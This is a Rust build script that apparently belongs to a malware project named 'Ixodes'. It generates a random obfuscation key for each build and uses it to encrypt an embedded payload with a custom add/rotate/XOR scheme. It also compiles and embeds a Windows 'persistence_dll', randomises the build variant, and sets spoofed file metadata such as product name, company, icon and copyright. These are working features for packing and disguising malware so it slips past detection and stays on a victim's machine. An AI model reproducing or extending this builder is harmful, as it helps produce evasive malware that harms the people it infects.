use rand::RngCore;
use rand::rngs::OsRng;
use std::env;
use std::error::Error;
use std::fs;
use std::io::Write;
use std::path::Path;

fn main() -> Result<(), Box<dyn Error>> {
    #[cfg(windows)]
    apply_windows_resources()?;

    let out_dir = env::var("OUT_DIR")?;

    let mut rng = OsRng;
    let seed = rng.next_u64();

    let mut task_salt = [0u8; 8];
    rng.fill_bytes(&mut task_salt);

    let mut shuffle_block = [0u8; 16];
    rng.fill_bytes(&mut shuffle_block);

    let mut obfuscation_key = [0u8; 32];
    rng.fill_bytes(&mut obfuscation_key);

    const VARIANTS: [&str; 4] = ["alpha", "beta", "gamma", "delta"];
    let variant = VARIANTS[(rng.next_u32() as usize) % VARIANTS.len()];
    println!("cargo:rustc-cfg=build_variant={variant:?}");

    // Handle embedded payload if provided
    if let Ok(payload_path) = env::var("IXODES_PAYLOAD_PATH") {
        let path = Path::new(&payload_path);
        if path.exists() {
            let payload_bytes = fs::read(path)?;
            let mut encrypted = payload_bytes;

            // Use the same encryption logic as in helpers/payload.rs
            for i in 0..encrypted.len() {
                let key_byte = obfuscation_key[i % obfuscation_key.len()];
                encrypted[i] = encrypted[i].wrapping_add((i.wrapping_mul(13)) as u8);
                encrypted[i] = encrypted[i].rotate_left((i % 8) as u32);
                encrypted[i] ^= key_byte;
            }

            let payload_out = Path::new(&out_dir).join("payload.blob");
            fs::write(&payload_out, encrypted)?;
            println!("cargo:rustc-cfg=feature=\"embedded_payload\"");
            println!(
                "cargo:info=successfully embedded payload from {}",
                payload_path
            );
        }
    }

    let dll_project_path = Path::new("persistence_dll");
    if dll_project_path.exists() {
        let status = std::process::Command::new("cargo")
            .args(&["build", "--release", "--target", "x86_64-pc-windows-msvc"])
            .current_dir(dll_project_path)
            .status();

        if let Ok(s) = status {
            if s.success() {
                let dll_src = dll_project_path
                    .join("target")
                    .join("x86_64-pc-windows-msvc")
                    .join("release")
                    .join("persistence_dll.dll");
                if dll_src.exists() {
                    let dll_out = Path::new(&out_dir).join("persistence_dll.blob");
                    fs::copy(dll_src, dll_out)?;
                    println!("cargo:rustc-cfg=feature=\"embedded_persistence_dll\"");
                }
            }
        }
    }

    for candidate in VARIANTS.iter() {
        println!(
            "cargo:rustc-check-cfg=cfg(build_variant, values({candidate:?}))",
            candidate = candidate
        );
    }

    let dest_path = Path::new(&out_dir).join("build_generated.rs");
    let mut file = fs::File::create(&dest_path)?;

    writeln!(file, "pub const TASK_ORDER_SEED: u64 = {seed};")?;
    writeln!(
        file,
        "pub const TASK_ORDER_SALT: [u8; 8] = [{}];",
        hex_list(&task_salt)
    )?;
    writeln!(
        file,
        "pub const BULK_RANDOM_BLOCK: [u8; 16] = [{}];",
        hex_list(&shuffle_block)
    )?;
    writeln!(
        file,
        "#[allow(dead_code)]\npub const OBFUSCATION_KEY: [u8; 32] = [{}];",
        hex_list(&obfuscation_key)
    )?;

    Ok(())
}

#[cfg(windows)]
fn apply_windows_resources() -> Result<(), Box<dyn Error>> {
    use winres::WindowsResource;

    let mut res = WindowsResource::new();
    let mut applied = false;

    if let Some(icon_path) = env::var("IXODES_ICON_PATH")
        .ok()
        .map(|value| value.trim().to_string())
        .filter(|value| !value.is_empty())
    {
        res.set_icon(&icon_path);
        applied = true;
    }

    applied |= set_winres_value(&mut res, "ProductName", "IXODES_PRODUCT_NAME");
    applied |= set_winres_value(&mut res, "FileDescription", "IXODES_FILE_DESCRIPTION");
    applied |= set_winres_value(&mut res, "CompanyName", "IXODES_COMPANY_NAME");
    applied |= set_winres_value(&mut res, "ProductVersion", "IXODES_PRODUCT_VERSION");
    applied |= set_winres_value(&mut res, "FileVersion", "IXODES_FILE_VERSION");
    applied |= set_winres_value(&mut res, "LegalCopyright", "IXODES_COPYRIGHT");

    if applied {
        res.compile()?;
    }

    Ok(())
}

#[cfg(windows)]
fn set_winres_value(res: &mut winres::WindowsResource, key: &str, env_key: &str) -> bool {
    if let Some(value) = env::var(env_key)
        .ok()
        .map(|value| value.trim().to_string())
        .filter(|value| !value.is_empty())
    {
        res.set(key, &value);
        true
    } else {
        false
    }
}

fn hex_list(values: &[u8]) -> String {
    let mut pieces = Vec::with_capacity(values.len());
    for byte in values {
        pieces.push(format!("0x{byte:02x}"));
    }
    pieces.join(", ")
}
